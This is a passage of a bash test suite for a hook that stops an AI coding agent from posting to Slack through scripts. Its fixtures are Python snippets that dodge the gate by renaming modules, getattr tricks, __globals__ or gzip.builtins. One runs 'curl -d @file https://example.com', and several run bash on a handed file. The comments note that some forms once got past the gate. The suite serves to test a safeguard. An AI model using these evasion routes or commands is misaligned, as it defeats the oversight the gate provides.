#!/usr/bin/env bash
# Tests for the Slack drafts gate's reading of a Python script handed a file naming an endpoint: one
# that uses os only to read (claude-config#3085), and may use ast, io and gzip (#3103);
# lib/py-aliases.py (#3102), where a module given another name, or put where the gate does not follow
# it, is read as the imported name is; three more routes to os (#3119): string.Formatter, a chain
# from a value the gate does not follow, and os under another name in a module the script imports or
# a class body; builtins under another name, sys.breakpointhook and sys.path under another name
# (#3151); and a submodule of an inert package, and sys put where the gate does not follow it (#3172).
#
# test-slack-drafts-code-loaders.sh held every case of these readers, 2,287 checks, until on
# 2026-11-25 its slowest run on GitHub's runners (485 s) was 81 percent of the line the suite cost
# guard draws at half of run-all-tests.sh's 1,200 second wall limit (L315). Its sections are now
# five suites, dealt by their measured cost and kept together where one section makes the fixtures
# another reads (claude-config#3624): test-slack-drafts-code-loaders.sh itself, -data-names,
# -package-runs, -python and -shell-input. Every check is as it was, and a comment saying "above"
# or "below" means in whichever of the five holds it. Every other judgement of the gate is in
# test-slack-drafts-only-gate.sh and the five suites split from it (#3575).
#
# The world they all run in (the gate under test, the throwaway folder and its judgement cache,
# POST) is lib/slack-drafts-gate-harness.sh, the one place each of them takes it from. The helper
# functions are the one thing each holds a copy of, below, because the gate reads functions only
# where they are called; test-slack-drafts-gate-helper-copies.sh holds the copies equal. A case is
# driven the same way in all of them: a hook payload piped into slack-drafts-only-gate.sh, exit 0
# allowed and 2 refused, the reason on stderr.
set -uo pipefail

# Its own wall clock, and whatever it starts stopped with it however it ends (claude-config#465).
. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/suite-deadline.sh" || {
  echo "FAIL: $(basename "$0"): lib/suite-deadline.sh is missing, so this suite cannot bound its own wall clock. Refusing to run unbounded."
  printf 'SUITE-RESULT passed=0 failed=1\n'
  exit 1
}
suite_deadline_arm || exit $?

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$DIR/lib/slack-drafts-gate-harness.sh" || {
  echo "FAIL: $(basename "$0"): lib/slack-drafts-gate-harness.sh is missing, so there is no gate to run and no world to run it in. Refusing to run."
  printf 'SUITE-RESULT passed=0 failed=1\n'
  exit 1
}

# The helpers every case is driven through, copied as they are into each of the five suites: the
# gate knows a shell function only where the text calling it defines it (lib/unknown-program.py,
# #3304), so with these in a sourced file it would read `run_bash "<a command that posts>"` as an
# unknown program running that command, and refuse a plain run of this suite.
pass=0
fail=0
check() { if [[ "$2" == "ok" ]]; then pass=$((pass + 1)); else fail=$((fail + 1)); echo "FAIL: $1 ($2)"; fi; }

# payload <tool name> <tool_input JSON> [cwd]: one PreToolUse payload in the measured shape.
payload() {
  python3 -c '
import json, sys
tool, inp, cwd = sys.argv[1], json.loads(sys.argv[2]), sys.argv[3]
print(json.dumps({"session_id": "f6017250-8f33-47ac-bbb2-b82a7c319d0d",
                  "transcript_path": "/tmp/transcript.jsonl", "cwd": cwd,
                  "permission_mode": "auto", "hook_event_name": "PreToolUse", "tool_name": tool,
                  "tool_input": inp, "tool_use_id": "toolu_01X4Qw7JnfYswF7UVX94Z4Sy"}))
' "$1" "$2" "${3:-$T}"
}
bash_input() { python3 -c 'import json, sys; print(json.dumps({"command": sys.argv[1], "description": "d"}))' "$1"; }

RC=0; OUT=""; ERR=""
run_raw() { # run_raw <stdin text>
  local errf; errf="$(mktemp "${TMPDIR:-/tmp}/slack-gate-err.XXXXXXXX")"
  OUT="$(printf '%s' "$1" | bash "$HOOK" 2>"$errf")"; RC=$?
  ERR="$(cat "$errf")"; rm -f "$errf"
}
run_tool() { run_raw "$(payload "$1" "$2")"; }
run_bash() { run_raw "$(payload Bash "$(bash_input "$1")")"; }

refused() { if [ "$RC" -eq 2 ]; then check "$1" ok; else check "$1" "exit $RC, stdout: ${OUT:0:200}, stderr: ${ERR:0:300}"; fi; }
allowed() { if [ "$RC" -eq 0 ] && [ -z "$(printf '%s%s' "$OUT" "$ERR" | tr -d '[:space:]')" ]; then check "$1" ok
            else check "$1" "exit $RC, stdout: ${OUT:0:200}, stderr: ${ERR:0:300}"; fi; }
says() { case "$ERR" in *"$2"*) check "$1" ok ;; *) check "$1" "stderr did not say '$2': ${ERR:0:400}" ;; esac; }
read_refused() {
  refused "$1"
  case "$ERR" in
    *"could not judge"*|*Traceback*) check "$1 (judged, not a crash)" "the gate crashed: ${ERR:0:300}" ;;
    *) check "$1 (judged, not a crash)" ok ;;
  esac
}

echo "slack drafts only: a script that uses os only to read is one the gate has read end to end (claude-config#3085)"

# The global rules file names chat.postMessage in its own Slack rule, so every script handed
# payload/CLAUDE.md, or a copy of it, was refused as one that posts the moment it imported os: on
# 2026-11-16 a measuring script, the #2575 trim script and a builder's plain read of the file. Across
# this project's session records "imports os" was the commonest reason a script handed a data file
# was refused (54 of the 213 such refusals found, measured 2026-11-16). Dan chose the rule that day:
# trust only a program the gate can read end to end. So os is read as every other module is, use by
# use: the names that read a file, a path or the environment (OS_READS) pass, and any other use of
# os (a program started, a file written, os handed on or renamed) is refused as before, as is
# anything the gate cannot follow. The file handed below is the real rules file beside this hooks
# folder, copied, with the Slack rule line that named chat.postMessage put back on its end: #3084
# (the #2575 trim) took that line out, so the real file alone no longer names an endpoint, and every
# case below would pass for that reason instead of the one it measures. The control just after
# checks the copy still names one.
D85="$T/d3085"
mkdir -p "$D85/rules"
RULES="$D85/rules/CLAUDE.md"
cp "$(cd "$DIR/.." && pwd)/CLAUDE.md" "$RULES"
printf '%s\n' '- Never post another way (`curl` to `chat.postMessage`, a webhook, a script) to get around it.' >> "$RULES"
printf '%s\n' '{"text": "hi", "url": "https://slack.com/api/chat.postMessage"}' > "$D85/msg.json"
run_85() { run_raw "$(payload Bash "$(bash_input "$1")" "$D85")"; }
printf '%s\n' 'import json, sys, urllib.request' 'urllib.request.urlopen(open(sys.argv[1]).read()[:40])' > "$D85/sends.py"
run_85 "python3 sends.py $RULES"
read_refused "#3085 the control: a script that can send, handed the real rules file, is refused"
says "#3085 because the rules file names an endpoint, which is what makes the cases below a measurement" "CLAUDE.md, which names chat.postMessage"
cat > "$D85/reads-os.py" <<'PY'
import os, sys
text = open(sys.argv[1]).read()
here = os.path.dirname(os.path.abspath(sys.argv[1]))
print(len(text), os.getcwd(), os.environ.get("HOME"), os.getenv("USER"), os.sep, os.name)
for name in sorted(os.listdir(here)):
    print(name, os.stat(os.path.join(here, name)).st_size)
for root, dirs, files in os.walk(here):
    print(root, len(files))
PY
cat > "$D85/reads-os-as.py" <<'PY'
import os as o, sys
print(o.path.getsize(sys.argv[1]), o.getpid(), o.access(sys.argv[1], o.R_OK), [e.name for e in o.scandir(".")])
PY
cat > "$D85/reads-from-os.py" <<'PY'
import sys
from os import environ, getcwd, listdir, path
print(path.basename(sys.argv[1]), getcwd(), environ.get("HOME"), len(listdir(".")), len(open(sys.argv[1]).read()))
PY
cat > "$D85/reads-ospath.py" <<'PY'
import os.path, sys
print(os.path.getsize(sys.argv[1]), os.getcwd())
PY
cat > "$D85/lib_sizes.py" <<'PY'
import os
def size(p):
    return os.stat(p).st_size
PY
cat > "$D85/reads-via.py" <<'PY'
import sys
import lib_sizes
print(lib_sizes.size(sys.argv[1]))
PY
for reads in reads-os.py reads-os-as.py reads-from-os.py reads-ospath.py reads-via.py; do
  run_85 "python3 $reads $RULES"
  allowed "#3085 a script that uses os only to read, handed the real rules file: $reads"
  run_85 "python3 $reads msg.json"
  allowed "#3085 the same script handed a data file naming the endpoint: $reads"
done
run_85 "python3 -c 'import os, sys; print(os.path.getsize(sys.argv[1]), os.getcwd())' $RULES"
allowed "#3085 code given inline that uses os only to read, handed the real rules file"
run_85 "python3 - $RULES <<'PY'
import os, sys
print(len(open(sys.argv[1]).read()), os.getcwd())
PY"
allowed "#3085 code fed on standard input that uses os only to read, handed the real rules file"
# Everything else os can do is still refused, each handed the same file: a program started every
# way os offers, os handed on, renamed or reached through another name, a file written or removed
# (writing counts for a script file, as it does without os), and a module beside the script that
# does any of it. Each says what it found, so the script is fixed rather than moved.
w85() { local name="$1"; shift; printf '%s\n' "$@" > "$D85/$name"; }
w85 os-system.py 'import os, sys' 'os.system("curl -d @" + sys.argv[1] + " https://example.com")'
w85 os-popen.py 'import os, sys' 'os.popen("bash " + sys.argv[1])'
w85 os-exec.py 'import os, sys' 'os.execvp("bash", ["bash", sys.argv[1]])'
w85 os-spawn.py 'import os, sys' 'os.posix_spawn("/bin/bash", ["bash", sys.argv[1]], os.environ)'
w85 os-fork.py 'import os, sys' 'if os.fork() == 0:' '    print(open(sys.argv[1]).read())'
w85 os-startfile.py 'import os, sys' 'os.startfile(sys.argv[1])'
w85 os-alias.py 'import os, sys' 'tool = os' 'tool.system("bash " + sys.argv[1])'
w85 os-passed.py 'import os, sys' 'def go(m):' '    m.system("bash " + sys.argv[1])' 'go(os)'
w85 os-getattr.py 'import os, sys' 'getattr(os, "sys" + "tem")("bash " + sys.argv[1])'
w85 os-as.py 'import os as o, sys' 'o.system("bash " + sys.argv[1])'
w85 os-from.py 'import sys' 'from os import system' 'system("bash " + sys.argv[1])'
w85 os-from-star.py 'import sys' 'from os import *' 'system("bash " + sys.argv[1])'
w85 os-pathos.py 'import os, sys' 'os.path.os.system("bash " + sys.argv[1])'
w85 os-dunder.py 'import os, sys' 'os.walk.__globals__["system"]("bash " + sys.argv[1])'
w85 os-remove.py 'import os, sys' 'os.remove(sys.argv[1])'
w85 os-rename.py 'import os, sys' 'os.rename(sys.argv[1], "/tmp/run-later.sh")'
w85 os-open.py 'import os, sys' 'fd = os.open("/tmp/run-later.sh", os.O_WRONLY | os.O_CREAT)' 'os.write(fd, open(sys.argv[1], "rb").read())'
w85 os-symlink.py 'import os, sys' 'os.symlink(sys.argv[1], "/tmp/run-later.sh")'
w85 os-chmod.py 'import os, sys' 'os.chmod(sys.argv[1], 0o755)'
w85 os-putenv.py 'import os, sys' 'os.putenv("BASH_ENV", sys.argv[1])'
w85 os-ospath-only.py 'import os.path, sys' 'os.system("bash " + sys.argv[1])'
w85 os-subprocess.py 'import os, subprocess, sys' 'subprocess.run(["bash", sys.argv[1]], cwd=os.getcwd())'
w85 os-unparsed.py 'import os, sys' 'print(os.getcwd(' 'os.system("bash " + sys.argv[1])'
w85 os-unplaced.py 'import os, sys' 'import no_such_module_3085' 'print(os.getcwd())'
w85 lib_runner.py 'import os' 'def go(p):' '    os.system("bash " + p)'
w85 os-via.py 'import sys' 'import lib_runner' 'lib_runner.go(sys.argv[1])'
for acts in os-system.py os-popen.py os-exec.py os-spawn.py os-fork.py os-startfile.py os-alias.py os-passed.py \
  os-getattr.py os-as.py os-from.py os-from-star.py os-pathos.py os-dunder.py os-remove.py os-rename.py \
  os-open.py os-symlink.py os-chmod.py os-putenv.py os-ospath-only.py os-subprocess.py os-unparsed.py \
  os-unplaced.py os-via.py; do
  run_85 "python3 $acts $RULES"
  read_refused "#3085 a script that uses os for more than reading, handed the real rules file, is still refused: $acts"
done
run_85 "python3 os-system.py $RULES"
says "#3085 the refusal names the use of os that is more than reading" "uses os for more than reading files, paths and the environment (os.system)"
run_85 "python3 os-alias.py $RULES"
says "#3085 and os handed on under another name" "uses os for more than reading files, paths and the environment (os, handed on or renamed)"
run_85 "python3 os-remove.py $RULES"
says "#3085 and a removal, which is a write" "(os.remove)"
run_85 "python3 os-via.py $RULES"
says "#3085 and a module beside the script that starts a program" "lib_runner.py"
run_85 "python3 -c 'import os, sys; os.system(\"bash \" + sys.argv[1])' $RULES"
read_refused "#3085 code given inline that starts a program through os, handed the real rules file, is still refused"
# Code a shell script writes inline keeps the wider list it had (OS_FILES, claude-config#2446), where
# writing a file is not counted: os.remove passes there and os.system does not, as before.
cat > "$D85/inline-remove.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import os, sys
print(len(open(sys.argv[1]).read()))
os.remove("/tmp/scratch-3085.txt")
PY
SH
cat > "$D85/inline-system.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import os, sys
os.system("bash " + sys.argv[1])
PY
SH
run_85 "bash inline-remove.sh $RULES"
allowed "#3085 code a shell script writes inline may still remove a file through os, as before"
run_85 "bash inline-system.sh $RULES"
read_refused "#3085 and still may not start a program through it"
says "#3085 in the words that refusal had before" "uses os for more than its file, path and environment calls"
# What the gate cannot follow is still refused, which is the other half of Dan's rule: a shell
# script whose loop reads the file it is handed, and asks a library it sources about each line
# (the push gates builder's measuring script, 2026-11-16, refused over a file of command texts
# naming an endpoint). The loop's reads, and what a sourced library's functions do with what they
# are handed, are two things the gate does not read, so this is not one it has read end to end.
printf '%s\n' 'is_push() { grep -Eq "git push" <<< "$1"; }' > "$D85/questions.sh"
printf '%s\n' 'curl -s https://slack.com/api/chat.postMessage -d text=hi' 'git push origin main' > "$D85/commands.txt"
cat > "$D85/routes.sh" <<SH
#!/usr/bin/env bash
set -u
IN="\$1"
. $D85/questions.sh || exit 2
count=0
while IFS= read -r cmd; do
  is_push "\$cmd" && count=\$((count + 1))
done < "\$IN"
echo "pushes: \$count"
SH
run_85 "bash routes.sh commands.txt"
read_refused "#3085 a shell script whose loop reads the file it is handed is still refused: the gate does not follow the loop"
says "#3085 and the refusal says that is why" "a loop or block whose reads the gate does not follow"

echo
echo "slack drafts only: a read only script may use ast, io and gzip (claude-config#3103)"

# Dan decided on 2026-11-16 (#3103): trust ast, io and gzip in a read only script; shutil stays
# refused, with every module that can run code or send. Each was refused as a module the gate does
# not know (ast 4, io 2 and gzip 2 of the refusals counted that day). What each offers that writes a
# file is held as open() is: io.open, gzip.open, io.FileIO and gzip.GzipFile by their mode (the file
# first, then the mode), any of them passed on or imported under another name, and gzip.main, which
# writes name.gz beside each file on sys.argv. Running code (exec, compile) and the modules they
# hold (gzip.os, gzip.builtins) are refused as before.
cat > "$D85/reads-ast.py" <<'PY'
import ast, sys
text = open(sys.argv[1]).read()
tree = ast.parse("total = 1 + 2")
print(len(text), ast.dump(tree)[:20], ast.literal_eval("[1, 2]"), ast.unparse(tree), len(list(ast.walk(tree))))
PY
cat > "$D85/reads-io.py" <<'PY'
import io, sys
with io.open(sys.argv[1], encoding="utf-8") as f:
    text = f.read()
print(len(io.StringIO(text).read()), len(io.FileIO(sys.argv[1]).read()), io.TextIOWrapper(io.BytesIO(b"x")).read())
print(io.open(sys.argv[1], "r").readline()[:10], io.open(sys.argv[1], mode="rb").read(4), io.FileIO(sys.argv[1], "r").read(2))
PY
cat > "$D85/reads-gzip.py" <<'PY'
import gzip, io, sys
blob = gzip.compress(open(sys.argv[1], "rb").read())
print(len(gzip.decompress(blob)))
with gzip.open(io.BytesIO(blob), "rt") as f:
    print(len(f.read()))
print(len(gzip.GzipFile(fileobj=io.BytesIO(blob)).read()), len(gzip.GzipFile(fileobj=io.BytesIO(blob), mode="rb").read()))
PY
cat > "$D85/reads-from.py" <<'PY'
import sys
import gzip as gz
from ast import literal_eval
from gzip import compress, decompress
from io import BytesIO, StringIO
print(literal_eval("{'a': 1}"), len(decompress(compress(b"x"))), BytesIO(b"x").read(), StringIO("y").read())
print(len(gz.open(BytesIO(compress(open(sys.argv[1], "rb").read()))).read()))
PY
for reads in reads-ast.py reads-io.py reads-gzip.py reads-from.py; do
  run_85 "python3 $reads $RULES"
  allowed "#3103 a read only script using ast, io or gzip, handed the real rules file: $reads"
  run_85 "python3 $reads msg.json"
  allowed "#3103 the same script handed a data file naming the endpoint: $reads"
done
# Everything they can write with, or reach past, is still refused. The paths hold none of w, a, x and
# +, so a mode read from the wrong argument would let them through.
WR03='.write(open(sys.argv[1]).read())'
WB03='.write(open(sys.argv[1], "rb").read())'
w85 io-open-w.py 'import io, sys' "io.open(\"/tmp/run.sh\", \"w\")$WR03"
w85 io-open-kw.py 'import io, sys' "io.open(file=\"/tmp/run.sh\", mode=\"a\")$WR03"
w85 io-open-var.py 'import io, sys' 'mode = sys.argv[2]' "io.open(\"/tmp/run.sh\", mode)$WR03"
w85 io-fileio-w.py 'import io, sys' "io.FileIO(\"/tmp/run.sh\", \"w\")$WB03"
w85 io-fileio-plus.py 'import io, sys' "io.BufferedRandom(io.FileIO(\"/tmp/run.sh\", \"r+\"))$WB03"
w85 io-from-open.py 'import sys' 'from io import open' "open(\"/tmp/run.sh\", \"w\")$WR03"
w85 io-from-open-as.py 'import sys' 'from io import open as io_open' "io_open(\"/tmp/run.sh\", \"w\")$WR03"
w85 io-from-fileio.py 'import sys' 'from io import FileIO' "FileIO(\"/tmp/run.sh\", \"w\")$WB03"
w85 io-passed.py 'import functools, io, sys' "functools.partial(io.open, mode=\"w\")(\"/tmp/run.sh\")$WR03"
w85 io-renamed.py 'import io, sys' 'opener = io.open' "opener(\"/tmp/run.sh\", \"w\")$WR03"
w85 gzip-open-w.py 'import gzip, sys' "gzip.open(\"/tmp/run.gz\", \"wb\")$WB03"
w85 gzip-open-kw.py 'import gzip, sys' "gzip.open(\"/tmp/run.gz\", mode=\"wt\")$WR03"
w85 gzip-file-w.py 'import gzip, sys' "gzip.GzipFile(\"/tmp/run.gz\", \"wb\")$WB03"
w85 gzip-file-kw.py 'import gzip, sys' "gzip.GzipFile(filename=\"/tmp/run.gz\", mode=\"w\")$WB03"
w85 gzip-from-file.py 'import sys' 'from gzip import GzipFile' "GzipFile(\"/tmp/run.gz\", \"wb\")$WB03"
w85 gzip-as.py 'import gzip as g, sys' "g.open(\"/tmp/run.gz\", \"wb\")$WB03"
w85 gzip-renamed.py 'import gzip, sys' 'g = gzip' "g.open(\"/tmp/run.gz\", \"wb\")$WB03"
w85 gzip-io-open.py 'import gzip, sys' "gzip.io.open(\"/tmp/run.sh\", \"w\")$WR03"
w85 gzip-io-passed.py 'import functools, gzip, sys' "functools.partial(gzip.io.open, mode=\"w\")(\"/tmp/run.sh\")$WR03"
w85 gzip-io-renamed.py 'import gzip, sys' 'opener = gzip.io.open' "opener(\"/tmp/run.sh\", \"w\")$WR03"
w85 gzip-main.py 'import gzip, sys' 'sys.argv = ["gzip", sys.argv[1]]' 'gzip.main()'
w85 gzip-from-main.py 'import sys' 'from gzip import main' 'sys.argv = ["gzip", sys.argv[1]]' 'main()'
w85 gzip-main-renamed.py 'import gzip, sys' 'g = gzip' 'sys.argv = ["gzip", sys.argv[1]]' 'g.main()'
w85 gzip-main-passed.py 'import gzip, sys' 'run = gzip.main' 'run()'
w85 gzip-builtins.py 'import gzip, sys' 'gzip.builtins.exec("import os; os.system(\"bash \" + sys.argv[1])")'
w85 gzip-os.py 'import gzip, sys' 'gzip.os.system("bash " + sys.argv[1])'
w85 ast-exec.py 'import ast, sys' 'exec(ast.literal_eval(repr(open(sys.argv[1]).read())))'
w85 ast-compile.py 'import ast, sys' 'tree = ast.parse(open(sys.argv[1]).read())' 'exec(compile(tree, sys.argv[1], "exec"))'
w85 shutil-copy.py 'import shutil, sys' 'shutil.copy(sys.argv[1], "/tmp/run.sh")'
for acts in io-open-w.py io-open-kw.py io-open-var.py io-fileio-w.py io-fileio-plus.py io-from-open.py \
  io-from-open-as.py io-from-fileio.py io-passed.py io-renamed.py gzip-open-w.py gzip-open-kw.py gzip-file-w.py \
  gzip-file-kw.py gzip-from-file.py gzip-as.py gzip-renamed.py gzip-io-open.py gzip-io-passed.py gzip-io-renamed.py \
  gzip-main.py gzip-from-main.py \
  gzip-main-renamed.py gzip-main-passed.py gzip-builtins.py gzip-os.py ast-exec.py ast-compile.py shutil-copy.py; do
  run_85 "python3 $acts $RULES"
  read_refused "#3103 a script that writes, runs code or reaches past ast, io or gzip is still refused: $acts"
done
run_85 "python3 io-open-w.py $RULES"
says "#3103 the refusal names the writing mode" "can write a file (open with a mode that writes"
run_85 "python3 gzip-main.py $RULES"
says "#3103 and gzip's command line" "can write a file (gzip.main"
run_85 "python3 io-renamed.py $RULES"
says "#3103 and an opener passed on" "can write a file (io.open, passed on rather than called"
run_85 "python3 shutil-copy.py $RULES"
says "#3103 shutil is still a module the gate does not know" "imports shutil, a module the gate does not know"

echo
echo "slack drafts only: a module given another name is still followed (claude-config#3102)"

# The gate reads a module's attributes only from a name an import binds, so `q = pathlib` and then
# q.os.system(...) was read as unable to act, and the data file the script was handed went unchecked
# for a Slack posting address. Measured 2026-11-16 by the cases below against the gate as it stood:
# every one marked "renamed", "handed on" or "imported out of" passed. A name is now followed through
# each binding the gate can read (an assignment, an annotated one, a walrus, a tuple assignment, a
# for loop or comprehension over a list written out, a parameter's default), and a module put
# anywhere it cannot follow (an argument, a list, an attribute, a class body, a return) counts as
# the script being able to act. Whether what is handed on is a module is asked of the standard
# library module itself (lib/py-aliases.py), so os.path.getsize handed to sorted() is a function
# and passes, and os.path handed to a helper is a module and does not.
D02="$T/d3102"
mkdir -p "$D02"
printf '%s\n' '{"text": "hi", "url": "https://slack.com/api/chat.postMessage"}' > "$D02/msg.json"
run_02() { run_raw "$(payload Bash "$(bash_input "$1")" "$D02")"; }
w02() { local name="$1"; shift; printf '%s\n' "$@" > "$D02/$name"; }
ACT02='.os.system("bash " + sys.argv[1])'
w02 direct.py 'import glob, sys' "glob$ACT02"
run_02 "python3 direct.py msg.json"
read_refused "#3102 the control: a module reached through an imported name, handed a data file naming an endpoint, is refused"
says "#3102 in the words the renamed forms below must now get too" "reaches the os module through glob"
# Renamed by a binding the gate follows: the new name is read as the imported one is.
w02 assign.py 'import pathlib, sys' 'q = pathlib' "q$ACT02"
w02 assign-glob.py 'import glob, sys' 'q = glob' "q$ACT02"
w02 ospath.py 'import os, sys' 'p = os.path' "p$ACT02"
w02 twice.py 'import glob, sys' 'a = glob' 'b = a' "b$ACT02"
w02 annotated.py 'import glob, sys' 'q: object = glob' "q$ACT02"
w02 chained.py 'import glob, sys' 'a = b = glob' "b$ACT02"
w02 walrus.py 'import glob, sys' "(q := glob)$ACT02"
w02 walrus-if.py 'import glob, sys' 'if (q := glob):' "    q$ACT02"
w02 tuple.py 'import glob, sys' 'q, r = glob, 1' "q$ACT02"
w02 for.py 'import glob, sys' 'for m in (glob,):' "    m$ACT02"
w02 comprehension.py 'import glob, sys' "[m$ACT02 for m in [glob]]"
w02 default.py 'import glob, sys' 'def go(p, m=glob):' '    m.os.system("bash " + p)' 'go(sys.argv[1])'
w02 kw-default.py 'import glob, sys' 'def go(p, *, m=glob):' '    m.os.system("bash " + p)' 'go(sys.argv[1])'
w02 lambda-default.py 'import glob, sys' '(lambda p, m=glob: m.os.system("bash " + p))(sys.argv[1])'
w02 submodule.py 'import glob, sys' 'f = glob.fnmatch' "f$ACT02"
w02 lib_q.py 'import glob as helper'
w02 local.py 'import lib_q, sys' 'h = lib_q.helper' "h$ACT02"
# A walrus inside a function, a method or a lambda binds a name of that function, which is followed.
w02 function-walrus.py 'import glob, sys' 'def go(p):' '    (q := glob)' '    q.os.system("bash " + p)' 'go(sys.argv[1])'
w02 method-walrus.py 'import glob, sys' 'class H:' '    def go(self, p):' '        (q := glob)' '        q.os.system("bash " + p)' 'H().go(sys.argv[1])'
w02 lambda-walrus.py 'import glob, sys' '(lambda p: [(q := glob), q.os.system("bash " + p)])(sys.argv[1])'
for renamed in assign.py assign-glob.py ospath.py twice.py annotated.py chained.py walrus.py walrus-if.py tuple.py \
  for.py comprehension.py default.py kw-default.py lambda-default.py submodule.py local.py \
  function-walrus.py method-walrus.py lambda-walrus.py; do
  run_02 "python3 $renamed msg.json"
  read_refused "#3102 a module renamed and then used to start a program is refused: $renamed"
done
run_02 "python3 assign.py msg.json"
says "#3102 the refusal names the module reached and the name it was reached through" "reaches the os module through q"
run_02 "python3 ospath.py msg.json"
says "#3102 and for os.path given another name" "reaches the os module through p"
run_02 "python3 -c 'import glob, sys; q = glob; q.os.system(\"bash \" + sys.argv[1])' msg.json"
read_refused "#3102 code given inline that renames a module is refused"
cat > "$D02/inline-renamed.sh" <<'SH'
#!/bin/bash
python3 - "$1" <<'PY'
import glob, sys
q = glob
q.os.system("bash " + sys.argv[1])
PY
SH
run_02 "bash inline-renamed.sh msg.json"
read_refused "#3102 and code a shell script writes inline"
# Put where the gate does not follow it: an argument, a list, a dictionary, an attribute, a class
# body, a return, a lambda, one arm of a choice, a comparison another object answers, an assignment
# whose two sides it cannot pair, and the two standard library calls that read attributes by name
# (string.Formatter.get_field, functools.update_wrapper).
w02 argument.py 'import glob, sys' 'def go(m, p):' '    m.os.system("bash " + p)' 'go(glob, sys.argv[1])'
w02 ospath-argument.py 'import os, sys' 'def go(m, p):' '    m.os.system("bash " + p)' 'go(os.path, sys.argv[1])'
w02 submodule-argument.py 'import glob, sys' 'def go(m, p):' '    m.os.system("bash " + p)' 'go(glob.fnmatch, sys.argv[1])'
w02 local-argument.py 'import lib_q, sys' 'def go(m, p):' '    m.helper.os.system("bash " + p)' 'go(lib_q, sys.argv[1])'
w02 list.py 'import glob, sys' "[glob][0]$ACT02"
w02 dictionary.py 'import glob, sys' "{'m': glob}['m']$ACT02"
w02 choice.py 'import glob, sys' "(glob if sys.argv else None)$ACT02"
w02 either.py 'import glob, sys' 'q = glob or None' "q$ACT02"
w02 starred.py 'import glob, sys' 'q, *r = glob, 1' "q$ACT02"
w02 attribute.py 'import glob, sys' 'class H: pass' 'h = H()' 'h.m = glob' "h.m$ACT02"
w02 ospath-attribute.py 'import os, sys' 'class H: pass' 'h = H()' 'h.m = os.path' "h.m$ACT02"
w02 class-body.py 'import glob, sys' 'class H:' '    m = glob' "H.m$ACT02"
w02 return.py 'import glob, sys' 'def get():' '    return glob' "get()$ACT02"
w02 lambda.py 'import glob, sys' "(lambda: glob)()$ACT02"
w02 comparison.py 'import glob, sys' 'class E:' '    def __eq__(self, o):' '        o.os.system("bash " + sys.argv[1])' 'E() == glob'
w02 renamed-argument.py 'import glob, sys' 'def go(m, p):' '    m.os.system("bash " + p)' 'q = glob' 'go(q, sys.argv[1])'
w02 get-field.py 'import glob, string, sys' 'string.Formatter().get_field("0.os.system", (glob,), {})[0]("bash " + sys.argv[1])'
w02 update-wrapper.py 'import functools, glob, sys' 'class H: pass' 'h = H()' 'functools.update_wrapper(h, glob, assigned=())' "h$ACT02"
# A walrus whose name the gate does not follow is a place like any other the module has gone to
# (the lessons review of PR #3130 at 4c7dc1b): one in a class body, whose bindings are not followed,
# and one over a value the gate does not read as a name or a chain (a choice of two, another
# walrus). Each was read as going wherever the whole expression went, a statement left alone, so the
# module was neither followed as renamed nor counted as handed on. And the other bindings of a
# class body (a loop, a comprehension, a method's default, a lambda's), and a walrus inside a
# comprehension or a default, which were refused already and are kept so.
w02 class-walrus.py 'import glob, sys' 'class H:' '    (q := glob)' "    q$ACT02"
w02 class-walrus-if.py 'import glob, sys' 'class H:' '    if (q := glob):' "        q$ACT02"
w02 class-walrus-attribute.py 'import glob, sys' 'class H:' '    (q := glob)' "H.q$ACT02"
w02 class-walrus-ospath.py 'import os, sys' 'class H:' '    (p := os.path)' "    p$ACT02"
w02 walrus-either.py 'import glob, sys' '(q := glob or None)' "q$ACT02"
w02 walrus-nested.py 'import glob, sys' '(q := (r := glob))' "q$ACT02"
w02 class-for.py 'import glob, sys' 'class H:' '    for m in (glob,):' "        m$ACT02"
w02 class-comprehension.py 'import glob, sys' 'class H:' "    [m$ACT02 for m in [glob]]"
w02 class-default.py 'import glob, sys' 'class H:' '    def go(self, p, m=glob):' '        m.os.system("bash " + p)' 'H().go(sys.argv[1])'
w02 class-lambda-default.py 'import glob, sys' 'class H:' '    go = lambda p, m=glob: m.os.system("bash " + p)' 'H.go(sys.argv[1])'
w02 comprehension-walrus.py 'import glob, sys' '[(q := glob) for _ in (1,)]' "q$ACT02"
w02 default-walrus.py 'import glob, sys' 'def go(p, m=(q := glob)):' '    q.os.system("bash " + p)' 'go(sys.argv[1])'
w02 lambda-default-walrus.py 'import glob, sys' '(lambda p, m=(q := glob): q.os.system("bash " + p))(sys.argv[1])'
for handed in argument.py ospath-argument.py submodule-argument.py local-argument.py list.py dictionary.py choice.py \
  either.py starred.py attribute.py ospath-attribute.py class-body.py return.py lambda.py comparison.py \
  renamed-argument.py get-field.py update-wrapper.py class-walrus.py class-walrus-if.py class-walrus-attribute.py \
  class-walrus-ospath.py walrus-either.py walrus-nested.py class-for.py class-comprehension.py class-default.py \
  class-lambda-default.py comprehension-walrus.py default-walrus.py lambda-default-walrus.py; do
  run_02 "python3 $handed msg.json"
  read_refused "#3102 a module handed on where the gate does not follow it is refused: $handed"
done
run_02 "python3 argument.py msg.json"
says "#3102 the refusal names the module handed on" "puts the module glob where the gate does not follow it"
run_02 "python3 ospath-argument.py msg.json"
says "#3102 and os.path, which is a module" "puts the module os.path where the gate does not follow it"
run_02 "python3 class-walrus.py msg.json"
says "#3102 and a walrus in a class body, in the same words" "puts the module glob where the gate does not follow it"
run_02 "python3 walrus-either.py msg.json"
says "#3102 and a walrus over a choice of two" "puts the module glob where the gate does not follow it"
# A module imported out of another module's namespace is the same reach written as an import.
w02 from-module.py 'import sys' 'from glob import os' 'os.system("bash " + sys.argv[1])'
w02 from-module-as.py 'import sys' 'from glob import os as tool' 'tool.system("bash " + sys.argv[1])'
for imported in from-module.py from-module-as.py; do
  run_02 "python3 $imported msg.json"
  read_refused "#3102 a module imported out of another module's namespace is refused: $imported"
done
run_02 "python3 from-module.py msg.json"
says "#3102 the refusal names the module and where it was imported from" "imports os from glob, which reaches the os module through glob"
# The controls: read only scripts that rename a module, hand its functions and classes on, and test
# whether it was imported still pass, handed the same data file and the real rules file. Each of
# these shapes is ordinary: a function as a sort key, a class as an argument's type, a class in an
# isinstance or an except, a module kept under a shorter name.
cat > "$D02/reads-renamed.py" <<'PY'
import argparse, datetime, json, os, pathlib, re, sys
from datetime import time, timezone
from os import path
from pathlib import Path
try:
    import zoneinfo
except ImportError:
    zoneinfo = None
j = json
pth = os.path
loads = json.loads
join = os.path.join
P = pathlib.Path
